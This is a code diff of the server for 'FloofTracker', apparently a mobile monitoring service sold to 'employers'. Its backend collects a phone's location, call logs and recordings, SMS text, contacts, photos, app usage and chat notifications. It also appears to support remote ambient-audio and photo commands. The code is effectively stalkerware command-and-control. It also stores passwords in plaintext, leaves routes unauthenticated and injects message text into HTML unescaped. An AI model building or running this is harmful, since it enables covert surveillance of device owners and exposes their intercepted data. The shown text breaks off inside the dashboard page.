@@ -1,163 +1,150 @@
-const express = require("express");
-const mongoose = require("mongoose");
-const crypto = require("crypto");
-const path = require("path");
+const express = require('express');
+const mongoose = require('mongoose');
+const crypto = require('crypto');
+const path = require('path');
 const app = express();
-app.use(express.json({ limit: "50mb" }));
-app.use(express.urlencoded({ limit: "50mb", extended: true }));
-app.use(express.static(__dirname + "/public"));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ limit: '50mb', extended: true }));
+app.use(express.static(__dirname + '/public'));
 
 const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
 
-mongoose
-  .connect(MONGO_URI)
-  .then(() => console.log("MongoDB connected"))
-  .catch((err) => console.error("MongoDB error:", err));
+mongoose.connect(MONGO_URI)
+    .then(() => console.log('MongoDB connected'))
+    .catch(err => console.error('MongoDB error:', err));
 
 // Schemas
 const EmployerSchema = new mongoose.Schema({
-  email: { type: String, unique: true },
-  password: String,
-  plan: { type: String, default: "free" },
-  created_at: { type: Date, default: Date.now },
+    email: { type: String, unique: true },
+    password: String,
+    plan: { type: String, default: 'free' },
+    created_at: { type: Date, default: Date.now }
 });
 
 const TokenSchema = new mongoose.Schema({
-  token: { type: String, unique: true },
-  employer_id: mongoose.Schema.Types.ObjectId,
-  device_name: { type: String, default: "" },
-  registered: { type: Boolean, default: false },
-  created_at: { type: Date, default: Date.now },
-  active: { type: Boolean, default: true },
+    token: { type: String, unique: true },
+    employer_id: mongoose.Schema.Types.ObjectId,
+    device_name: { type: String, default: '' },
+    registered: { type: Boolean, default: false },
+    created_at: { type: Date, default: Date.now },
+    active: { type: Boolean, default: true }
 });
 
 const DeviceSchema = new mongoose.Schema({
-  token: String,
-  device_model: String,
-  android_version: String,
-  last_seen: Date,
+    token: String,
+    device_model: String,
+    android_version: String,
+    last_seen: Date
 });
 
 const GpsSchema = new mongoose.Schema({
-  token: String,
-  latitude: Number,
-  longitude: Number,
-  accuracy: Number,
-  received_at: Date,
+    token: String,
+    latitude: Number,
+    longitude: Number,
+    accuracy: Number,
+    received_at: Date
 });
 
 const CallSchema = new mongoose.Schema({
-  token: String,
-  number: String,
-  contact_name: String,
-  call_type: String,
-  duration_seconds: Number,
-  called_at: Number,
+    token: String,
+    number: String,
+    contact_name: String,
+    call_type: String,
+    duration_seconds: Number,
+    called_at: Number
 });
 
 const SmsSchema = new mongoose.Schema({
-  token: String,
-  number: String,
-  contact_name: String,
-  message_body: String,
-  sms_type: String,
-  received_at: Number,
+    token: String,
+    number: String,
+    contact_name: String,
+    message_body: String,
+    sms_type: String,
+    received_at: Number
 });
 
 const AppSchema = new mongoose.Schema({
-  token: String,
-  app_name: String,
-  package_name: String,
-  usage_seconds: Number,
-  usage_date: String,
+    token: String,
+    app_name: String,
+    package_name: String,
+    usage_seconds: Number,
+    usage_date: String
 });
 
 const ContactSchema = new mongoose.Schema({
-  token: String,
-  name: String,
-  number: String,
+    token: String,
+    name: String,
+    number: String
 });
 
 const MediaSchema = new mongoose.Schema({
-  token: String,
-  filename: String,
-  date_taken: Number,
-  path: String,
-  size_bytes: Number,
-  is_screenshot: Boolean,
-  thumbnail: String,
+    token: String,
+    filename: String,
+    date_taken: Number,
+    path: String,
+    size_bytes: Number,
+    is_screenshot: Boolean,
+    thumbnail: String
 });
 
 const NotificationSchema = new mongoose.Schema({
-  token: String,
-  app: String,
-  sender: String,
-  chat_id: { type: String, default: "" },
-  recipient: { type: String, default: "" },
-  message: String,
-  direction: { type: String, default: "incoming" },
-  received_at: Date,
+    token: String,
+    app: String,
+    sender: String,
+    chat_id: { type: String, default: '' },
+    recipient: { type: String, default: '' },
+    message: String,
+    direction: { type: String, default: 'incoming' },
+    received_at: Date
 });
 
 const DownloadRequestSchema = new mongoose.Schema({
-  token: String,
-  filename: String,
-  image_id: String,
-  status: { type: String, default: "pending" }, // pending, uploaded, downloaded
-  full_image: String, // base64 full quality
-  requested_at: { type: Date, default: Date.now },
+    token: String,
+    filename: String,
+    image_id: String,
+    status: { type: String, default: 'pending' }, // pending, uploaded, downloaded
+    full_image: String, // base64 full quality
+    requested_at: { type: Date, default: Date.now }
 });
 
-const DownloadRequest = mongoose.model(
-  "DownloadRequest",
-  DownloadRequestSchema,
-);
+const DownloadRequest = mongoose.model('DownloadRequest', DownloadRequestSchema);
 
 const CallRecordingSchema = new mongoose.Schema({
-  token: String,
-  filename: String,
-  audio_base64: String,
-  duration: Number,
-  size_kb: Number,
-  recorded_at: Number,
-  received_at: { type: Date, default: Date.now },
+    token: String,
+    filename: String,
+    audio_base64: String,
+    recorded_at: Number,
+    received_at: { type: Date, default: Date.now }
 });
-
 const CommandSchema = new mongoose.Schema({
-  token: String,
-  type: { type: String }, // 'record_ambient' or 'take_photo'
-  status: { type: String, default: "pending" }, // pending, executing, done, failed
-  duration: { type: Number, default: 30 }, // seconds for audio
-  result: String, // base64 result
-  created_at: { type: Date, default: Date.now },
-  completed_at: Date,
+    token: String,
+    type: { type: String }, // 'record_ambient' or 'take_photo'
+    status: { type: String, default: 'pending' }, // pending, executing, done, failed
+    duration: { type: Number, default: 30 }, // seconds for audio
+    result: String, // base64 result
+    created_at: { type: Date, default: Date.now },
+    completed_at: Date
 });
 
-const Command = mongoose.model("Command", CommandSchema);
-const CallRecording = mongoose.model("CallRecording", CallRecordingSchema);
-const Employer = mongoose.model("Employer", EmployerSchema);
-const Token = mongoose.model("Token", TokenSchema);
-const Device = mongoose.model("Device", DeviceSchema);
-const Gps = mongoose.model("Gps", GpsSchema);
-const Call = mongoose.model("Call", CallSchema);
-const Sms = mongoose.model("Sms", SmsSchema);
-const App = mongoose.model("App", AppSchema);
-const Contact = mongoose.model("Contact", ContactSchema);
-const Media = mongoose.model("Media", MediaSchema);
-const Notification = mongoose.model("Notification", NotificationSchema);
+const Command = mongoose.model('Command', CommandSchema);
+const CallRecording = mongoose.model('CallRecording', CallRecordingSchema)
+const Employer = mongoose.model('Employer', EmployerSchema);
+const Token = mongoose.model('Token', TokenSchema);
+const Device = mongoose.model('Device', DeviceSchema);
+const Gps = mongoose.model('Gps', GpsSchema);
+const Call = mongoose.model('Call', CallSchema);
+const Sms = mongoose.model('Sms', SmsSchema);
+const App = mongoose.model('App', AppSchema);
+const Contact = mongoose.model('Contact', ContactSchema);
+const Media = mongoose.model('Media', MediaSchema);
+const Notification = mongoose.model('Notification', NotificationSchema);
 const Recording = mongoose.model("Recording", CallRecordingSchema);
 
-const PLAN_LIMITS = {
-  free: 1,
-  starter: 5,
-  business: 10,
-  professional: 20,
-  enterprise: 50,
-};
+const PLAN_LIMITS = { free: 1, starter: 5, business: 10, professional: 20, enterprise: 50 };
 
 function getToken(req) {
-  return req.headers["x-device-token"] || "unknown";
+    return req.headers['x-device-token'] || 'unknown';
 }
 
 const styles = `
@@ -204,304 +191,228 @@ const styles = `
 
 // ── Employer Routes ──────────────────────────────────────────────────────────
 
-app.post("/employer/register", async (req, res) => {
-  try {
-    const { email, password } = req.body;
-    const existing = await Employer.findOne({ email });
-    if (existing)
-      return res.json({ success: false, message: "Email already exists" });
-    const employer = await Employer.create({ email, password });
-    res.json({ success: true, employer_id: employer._id });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/employer/login", async (req, res) => {
-  try {
-    const { email, password } = req.body;
-    const employer = await Employer.findOne({ email, password });
-    if (!employer)
-      return res.json({ success: false, message: "Invalid credentials" });
-    res.json({ success: true, employer_id: employer._id, plan: employer.plan });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/employer/set-plan", async (req, res) => {
-  try {
-    const { employer_id, plan } = req.body;
-    await Employer.findByIdAndUpdate(employer_id, { plan });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/employer/generate-token", async (req, res) => {
-  try {
-    const { employer_id } = req.body;
-    const employer = await Employer.findById(employer_id);
-    if (!employer)
-      return res.json({ success: false, message: "Employer not found" });
-    const tokenCount = await Token.countDocuments({
-      employer_id,
-      active: true,
-    });
-    const limit = PLAN_LIMITS[employer.plan] || 1;
-    if (tokenCount >= limit) {
-      return res.json({
-        success: false,
-        message: `Device limit reached for ${employer.plan} plan. Please upgrade.`,
-      });
+app.post('/employer/register', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+        const existing = await Employer.findOne({ email });
+        if (existing) return res.json({ success: false, message: 'Email already exists' });
+        const employer = await Employer.create({ email, password });
+        res.json({ success: true, employer_id: employer._id });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
     }
-    const token = crypto.randomBytes(16).toString("hex");
-    await Token.create({ token, employer_id });
-    res.json({ success: true, token });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
 });
 
-app.post("/employer/tokens", async (req, res) => {
-  try {
-    const { employer_id } = req.body;
-    const tokens = await Token.find({ employer_id, active: true });
-    res.json({ success: true, tokens });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/employer/login', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+        const employer = await Employer.findOne({ email, password });
+        if (!employer) return res.json({ success: false, message: 'Invalid credentials' });
+        res.json({ success: true, employer_id: employer._id, plan: employer.plan });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
-app.post("/employer/delete-token", async (req, res) => {
-  try {
-    const { token_id } = req.body;
-    await Token.findByIdAndUpdate(token_id, { active: false });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/employer/set-plan', async (req, res) => {
+    try {
+        const { employer_id, plan } = req.body;
+        await Employer.findByIdAndUpdate(employer_id, { plan });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/generate-token', async (req, res) => {
+    try {
+        const { employer_id } = req.body;
+        const employer = await Employer.findById(employer_id);
+        if (!employer) return res.json({ success: false, message: 'Employer not found' });
+        const tokenCount = await Token.countDocuments({ employer_id, active: true });
+        const limit = PLAN_LIMITS[employer.plan] || 1;
+        if (tokenCount >= limit) {
+            return res.json({ success: false, message: `Device limit reached for ${employer.plan} plan. Please upgrade.` });
+        }
+        const token = crypto.randomBytes(16).toString('hex');
+        await Token.create({ token, employer_id });
+        res.json({ success: true, token });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/tokens', async (req, res) => {
+    try {
+        const { employer_id } = req.body;
+        const tokens = await Token.find({ employer_id, active: true });
+        res.json({ success: true, tokens });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/delete-token', async (req, res) => {
+    try {
+        const { token_id } = req.body;
+        await Token.findByIdAndUpdate(token_id, { active: false });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // ── Device Routes ────────────────────────────────────────────────────────────
 
-app.post("/device/validate-token", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const valid = await Token.findOne({ token, active: true });
-    if (!valid) return res.json({ success: false, message: "Invalid token" });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/register", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await Device.findOneAndUpdate(
-      { token },
-      { token, ...req.body, last_seen: new Date() },
-      { upsert: true },
-    );
-    await Token.findOneAndUpdate(
-      { token },
-      { registered: true, device_name: req.body.device_model },
-    );
-    console.log(`Device registered: ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/gps", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await Gps.create({ token, ...req.body, received_at: new Date() });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/calls", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await Call.deleteMany({ token });
-    await Call.insertMany(req.body.map((c) => ({ token, ...c })));
-    console.log(`${req.body.length} calls from ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/sms", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const messages = req.body;
-
-    for (const msg of messages) {
-      const existing = await Sms.findOne({
-        token,
-        number: msg.number,
-        received_at: msg.received_at,
-      });
-      if (!existing) {
-        await Sms.create({ token, ...msg });
-      }
+app.post('/device/validate-token', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const valid = await Token.findOne({ token, active: true });
+        if (!valid) return res.json({ success: false, message: 'Invalid token' });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
     }
-
-    console.log(`${messages.length} SMS from ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
 });
 
-app.post("/device/apps", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await App.deleteMany({ token });
-    await App.insertMany(req.body.map((a) => ({ token, ...a })));
-    console.log(`${req.body.length} apps from ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/contacts", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await Contact.deleteMany({ token });
-    await Contact.insertMany(req.body.map((c) => ({ token, ...c })));
-    console.log(`${req.body.length} contacts from ${token}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/media", async (req, res) => {
-  try {
-    const token = getToken(req);
-    console.log(
-      `Media received from token: ${token}, count: ${req.body.length}`,
-    );
-    const deleted = await Media.deleteMany({ token });
-    console.log(`Deleted ${deleted.deletedCount} old media records`);
-    await Media.insertMany(req.body.map((m) => ({ token, ...m })));
-    res.json({ success: true });
-  } catch (e) {
-    console.error("Media error:", e.message);
-    res.json({ success: false, message: e.message });
-  }
-});
-
-app.post("/device/notifications", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const { app, sender, chat_id, message, received_at } = req.body;
-
-    // Check if exact message already exists for this sender
-    const existing = await Notification.findOne({
-      token,
-      app,
-      sender,
-      message,
-    });
-
-    if (!existing) {
-      await Notification.create({
-        token,
-        ...req.body,
-        received_at: new Date(),
-      });
-      console.log(`Notification from ${token}: ${app} - ${sender}`);
+app.post('/device/register', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await Device.findOneAndUpdate(
+            { token },
+            { token, ...req.body, last_seen: new Date() },
+            { upsert: true }
+        );
+        await Token.findOneAndUpdate(
+            { token },
+            { registered: true, device_name: req.body.device_model }
+        );
+        console.log(`Device registered: ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
     }
-
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
 });
 
-app.post("/device/call-recording", async (req, res) => {
-  try {
-    const token = getToken(req);
-    await CallRecording.create({ token, ...req.body });
-    console.log(`Call recording received from ${token}: ${req.body.filename}`);
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-// Employer sends command
-app.post("/employer/command", async (req, res) => {
-  try {
-    const { token, type, duration } = req.body;
-    const command = await Command.create({
-      token,
-      type,
-      duration: duration || 30,
-    });
-    res.json({ success: true, command_id: command._id });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
-});
-
-// Device polls for pending commands
-app.get("/device/commands", async (req, res) => {
-  try {
-    const token = getToken(req);
-    const commands = await Command.find({ token, status: "pending" });
-    // Mark as executing
-    for (const cmd of commands) {
-      await Command.findByIdAndUpdate(cmd._id, { status: "executing" });
+app.post('/device/gps', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await Gps.create({ token, ...req.body, received_at: new Date() });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
     }
-    res.json({ success: true, commands });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
 });
 
-// Device sends result
-app.post("/device/command-result", async (req, res) => {
-  try {
-    const { command_id, result, status } = req.body;
-    await Command.findByIdAndUpdate(command_id, {
-      result,
-      status: status || "done",
-      completed_at: new Date(),
-    });
-    res.json({ success: true });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/device/calls', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await Call.deleteMany({ token });
+        await Call.insertMany(req.body.map(c => ({ token, ...c })));
+        console.log(`${req.body.length} calls from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
-// Employer gets command results
-app.post("/employer/command-results", async (req, res) => {
-  try {
-    const { token } = req.body;
-    const commands = await Command.find({ token, status: "done" })
-      .sort({ completed_at: -1 })
-      .limit(20);
-    res.json({ success: true, commands });
-  } catch (e) {
-    res.json({ success: false, message: e.message });
-  }
+app.post('/device/sms', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const messages = req.body;
+        
+        for (const msg of messages) {
+            const existing = await Sms.findOne({
+                token,
+                number: msg.number,
+                received_at: msg.received_at
+            });
+            if (!existing) {
+                await Sms.create({ token, ...msg });
+            }
+        }
+        
+        console.log(`${messages.length} SMS from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/apps', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await App.deleteMany({ token });
+        await App.insertMany(req.body.map(a => ({ token, ...a })));
+        console.log(`${req.body.length} apps from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/contacts', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await Contact.deleteMany({ token });
+        await Contact.insertMany(req.body.map(c => ({ token, ...c })));
+        console.log(`${req.body.length} contacts from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/media', async (req, res) => {
+    try {
+        const token = getToken(req);
+        console.log(`Media received from token: ${token}, count: ${req.body.length}`);
+        const deleted = await Media.deleteMany({ token });
+        console.log(`Deleted ${deleted.deletedCount} old media records`);
+        await Media.insertMany(req.body.map(m => ({ token, ...m })));
+        res.json({ success: true });
+    } catch (e) {
+        console.error('Media error:', e.message);
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/notifications', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const { app, sender, chat_id, message, received_at } = req.body;
+        
+        // Check if exact message already exists for this sender
+        const existing = await Notification.findOne({ 
+            token, app, sender, message
+        });
+        
+        if (!existing) {
+            await Notification.create({ token, ...req.body, received_at: new Date() });
+            console.log(`Notification from ${token}: ${app} - ${sender}`);
+        }
+        
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/call-recording', async (req, res) => {
+    try {
+        const token = getToken(req);
+        await CallRecording.create({ token, ...req.body });
+        console.log(`Call recording received from ${token}: ${req.body.filename}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 // ── Frontend Pages ───────────────────────────────────────────────────────────
 
-app.get("/", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
+app.get('/', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
     ${styles}
     .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
     .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
@@ -544,8 +455,8 @@ app.get("/", (req, res) => {
     </body></html>`);
 });
 
-app.get("/register", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title>Register - FloofTracker</title><style>
+app.get('/register', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Register - FloofTracker</title><style>
     ${styles}
     .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
     .login-box { background:white; border-radius:16px; padding:40px; width:380px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
@@ -590,8 +501,8 @@ app.get("/register", (req, res) => {
     </body></html>`);
 });
 
-app.get("/welcome", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
+app.get('/welcome', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
     ${styles}
     .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px,1fr)); gap:16px; margin:20px 0; }
     .feature-item { background:#f8f8f8; border-radius:10px; padding:20px; text-align:center; }
@@ -623,8 +534,8 @@ app.get("/welcome", (req, res) => {
     </body></html>`);
 });
 
-app.get("/plans", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title>Plans - FloofTracker</title><style>
+app.get('/plans', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Plans - FloofTracker</title><style>
     ${styles}
     .btn { padding:12px 24px; font-size:14px; width:100%; margin-top:12px; }
     </style></head><body>
@@ -683,8 +594,8 @@ app.get("/plans", (req, res) => {
     </body></html>`);
 });
 
-app.get("/tokens", (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><title>Devices - FloofTracker</title><style>
+app.get('/tokens', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Devices - FloofTracker</title><style>
     ${styles}
     .top-bar { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
     </style></head><body>
@@ -783,33 +694,29 @@ app.get("/tokens", (req, res) => {
 });
 
 // Per-device dashboard with tabs
-app.get("/device", async (req, res) => {
-  if (!token) return res.redirect("/tokens");
+app.get('/device', async (req, res) => {
+    const token = req.query.token;
 
-  const device = await Device.findOne({ token });
-  const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
-  const calls = await Call.find({ token }).sort({ called_at: -1 });
-  const recordings = await CallRecording.find({ token }).sort({
-    recorded_at: -1,
-  });
-  const sms = await Sms.find({ token }).sort({ received_at: -1 });
-  const apps = await App.find({ token }).sort({ usage_seconds: -1 });
-  const contacts = await Contact.find({ token });
-  const media = await Media.find({ token }).sort({ date_taken: -1 });
-  const notifications = await Notification.find({ token })
-    .sort({ received_at: -1 })
-    .limit(200);
-  const token = req.query.token;
+    if (!token) return res.redirect('/tokens');
+    const device = await Device.findOne({ token });
+    const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
+    const calls = await Call.find({ token }).sort({ called_at: -1 });
+    const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 });
+    const sms = await Sms.find({ token }).sort({ received_at: -1 });
+    const apps = await App.find({ token }).sort({ usage_seconds: -1 });
+    const contacts = await Contact.find({ token });
+    const media = await Media.find({ token }).sort({ date_taken: -1 });
+    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);
 
-  res.send(`<!DOCTYPE html><html><head>
-    <title>${device?.device_model || "Device"} - FloofTracker</title>
+    res.send(`<!DOCTYPE html><html><head>
+    <title>${device?.device_model || 'Device'} - FloofTracker</title>
     <meta http-equiv="refresh" content="30">
     <style>${styles}</style>
     </head><body>
     <div class="header">
         <div>
-            <h1>📱 ${device?.device_model || "Device"}</h1>
-            <small style="color:#aaa">Android ${device?.android_version || ""} &nbsp;·&nbsp; Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : "Never"}</small>
+            <h1>📱 ${device?.device_model || 'Device'}</h1>
+            <small style="color:#aaa">Android ${device?.android_version || ''} &nbsp;·&nbsp; Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}</small>
         </div>
         <div style="display:flex;gap:8px">
             <button class="btn btn-primary" onclick="window.location.href='/tokens'">← Back</button>
@@ -831,148 +738,144 @@ app.get("/device", async (req, res) => {
         <!-- Apps Tab -->
         <div id="tab-apps" class="tab-content active">
             <div class="card" style="padding:0">
-                ${
-                  apps.length === 0
-                    ? '<p class="no-data">No app usage data</p>'
-                    : `
+                ${apps.length === 0 ? '<p class="no-data">No app usage data</p>' : `
                 <table>
                     <tr><th>App</th><th>Usage</th><th>Date</th></tr>
-                    ${apps.map((a) => `<tr><td>${a.app_name}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${a.usage_date}</td></tr>`).join("")}
-                </table>`
-                }
+                    ${apps.map(a => `<tr><td>${a.app_name}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${a.usage_date}</td></tr>`).join('')}
+                </table>`}
             </div>
         </div>
 
        <!-- Calls Tab -->
 <div id="tab-calls" class="tab-content">
     <div class="card" style="padding:0">
-        ${
-          calls.length === 0
-            ? '<p class="no-data">No call logs</p>'
-            : `
+        ${calls.length === 0 ? '<p class="no-data">No call logs</p>' : `
         <table>
             <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th>Recording</th></tr>
-            ${calls
-              .map((c) => {
+            ${calls.map(c => {
                 // Match recording within 60 seconds of call
-                const recording = recordings.find(
-                  (r) => Math.abs(r.recorded_at - c.called_at) < 60000,
+                const recording = recordings.find(r => 
+                    Math.abs(r.recorded_at - c.called_at) < 60000
                 );
                 return `<tr>
                     <td>${c.number}</td>
-                    <td>${c.contact_name || "-"}</td>
+                    <td>${c.contact_name || '-'}</td>
                     <td>${c.call_type}</td>
                     <td>${c.duration_seconds}s</td>
                     <td>${new Date(c.called_at).toLocaleString()}</td>
-                    <td>${
-                      recording
-                        ? '<div><audio controls src="data:audio/mp4;base64,' +
-                          recording.audio_base64 +
-                          '" style="height:32px;width:200px"></audio>' +
-                          '<div style="color:#888;font-size:11px">' +
-                          (recording.duration || 0) +
-                          "s · " +
-                          (recording.size_kb || 0) +
-                          "KB</div></div>"
-                        : '<span style="color:#888;font-size:12px">No recording</span>'
+                    <td>${recording ? 
+                        `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" style="height:32px;width:200px"></audio>` : 
+                        '<span style="color:#888;font-size:12px">No recording</span>'
                     }</td>
                 </tr>`;
-              })
-              .join("")}
-        </table>`
-        }
+            }).join('')}
+        </table>`}
     </div>
 </div>
 
         <!-- SMS Tab -->
         <div id="tab-sms" class="tab-content">
             <div class="card" style="padding:0">
-                ${
-                  sms.length === 0
-                    ? '<p class="no-data">No SMS messages</p>'
-                    : `
+                ${sms.length === 0 ? '<p class="no-data">No SMS messages</p>' : `
                 <table>
                     <tr><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
-                    ${sms
-                      .map(
-                        (s) => `<tr>
+                    ${sms.map(s => `<tr>
                         <td>${s.number}</td>
                         <td>${s.sms_type}</td>
                         <td>${s.message_body}</td>
                         <td>${new Date(s.received_at).toLocaleString()}</td>
-                    </tr>`,
-                      )
-                      .join("")}
-                </table>`
-                }
+                    </tr>`).join('')}
+                </table>`}
             </div>
         </div>
 
         <!-- GPS Tab -->
         <div id="tab-gps" class="tab-content">
             <div class="card" style="padding:0">
-                ${
-                  gps.length === 0
-                    ? '<p class="no-data">No GPS data yet</p>'
-                    : `
+                ${gps.length === 0 ? '<p class="no-data">No GPS data yet</p>' : `
                 <table>
                     <tr><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
-                    ${gps
-                      .map(
-                        (g) => `<tr>
+                    ${gps.map(g => `<tr>
                         <td>${g.latitude}</td>
                         <td>${g.longitude}</td>
                         <td>${g.accuracy}m</td>
                         <td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td>
                         <td>${new Date(g.received_at).toLocaleString()}</td>
-                    </tr>`,
-                      )
-                      .join("")}
-                </table>`
-                }
+                    </tr>`).join('')}
+                </table>`}
             </div>
         </div>
 
         <!-- Contacts Tab -->
         <div id="tab-contacts" class="tab-content">
             <div class="card" style="padding:0">
-                ${
-                  contacts.length === 0
-                    ? '<p class="no-data">No contacts</p>'
-                    : `
+                ${contacts.length === 0 ? '<p class="no-data">No contacts</p>' : `
                 <table>
                     <tr><th>Name</th><th>Number</th></tr>
-                    ${contacts.map((c) => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join("")}
-                </table>`
-                }
+                    ${contacts.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}
+                </table>`}
             </div>
         </div>
 
-                <!-- Media Tab -->
-            <div id="tab-media" class="tab-content">
-                <div class="card" style="padding:0">
-                    ${
-                    media.length === 0
-                        ? '<p class="no-data">No media files</p>'
-                        : `
-                    <table>
-                        <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
-                    ${media
-                        .map(
-                        (m) => `<tr>
-                                    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" style="cursor:pointer" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : "No preview"}</td>
-                                    <td>${m.filename}</td>
-                                    <td>${m.is_screenshot ? "📸 Screenshot" : "🖼️ Photo"}</td>
-                                    <td>${Math.round(m.size_bytes / 1024)}KB</td>
-                                    <td>${new Date(m.date_taken).toLocaleString()}</td>
-                                    <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
-                                </tr>`,
-                        )
-                        .join("")}
-                    </table>`
-                    }
-                </div>
+        <!-- Remote Control Tab -->
+<div id="tab-remote" class="tab-content">
+    <div class="card">
+        <h3 style="color:#1a1a2e;margin-bottom:6px">Remote Control</h3>
+        <p style="color:#888;font-size:13px;margin-bottom:20px">Commands are executed within 2 minutes when device is active.</p>
+        
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px">
+            <div style="background:#f8f8f8;border-radius:12px;padding:20px;text-align:center">
